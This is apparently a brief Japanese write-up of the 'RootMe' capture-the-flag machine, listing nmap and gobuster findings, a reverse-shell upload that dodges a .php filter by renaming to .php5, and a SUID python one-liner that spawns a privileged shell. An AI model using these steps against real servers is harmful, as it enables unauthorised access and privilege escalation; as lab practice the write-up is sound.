---
title: "RootMe"
date: 2024-02-20T02:16:10+09:00
draft: false
---

植峰ノルジュ，最近マジでアツい\
マイクラ配信がおもしろすぎる

### enum

- nmap
  - ```22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)```
  - ```80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))```
- gobuster
  - /panel：ファイルアップロード用
  - /uploads：アップロードが見える

### user.txt

- リバースシェルをアップロードすればいい
- .php のフィルタがかかっているので .php5 とかにでもしてアップロード

### root.txt

- linpeas.sh で /usr/bin/python がヒットしたので GTFObin でみる
  - ```python -c 'import os; os.execl("/bin/sh", "sh", "-p")’```
- おしまい
